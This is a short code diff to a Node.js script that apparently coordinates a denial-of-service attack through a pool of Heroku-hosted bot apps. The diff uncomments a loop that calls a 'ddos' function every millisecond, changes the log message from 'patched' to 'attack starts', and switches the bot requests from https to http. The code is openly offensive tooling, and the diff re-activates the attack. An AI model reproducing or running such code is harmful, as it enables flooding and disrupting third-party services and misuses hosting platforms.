@@ -16,15 +16,16 @@ res.end()
 // ddos(msg.initial)
 // })
 
-// setInterval(ddos,1)
-console.log("patched")
+setInterval(ddos,1)
+console.log("attack starts")
 var count=0;
 function ddos(){
 
-    const uril="https://"+botArray[count]+".herokuapp.com?index="+count+"count=3"
+    const uril="http://"+botArray[count]+".herokuapp.com?index="+count+"count=3"
+    console.log(uril)
     count=count+4;
     if(count>=botArray.length) count=0;
-    https.get(uril, {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
+    http.get(uril, {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
         let pythonData = '';
       
         // A chunk of data has been recieved.
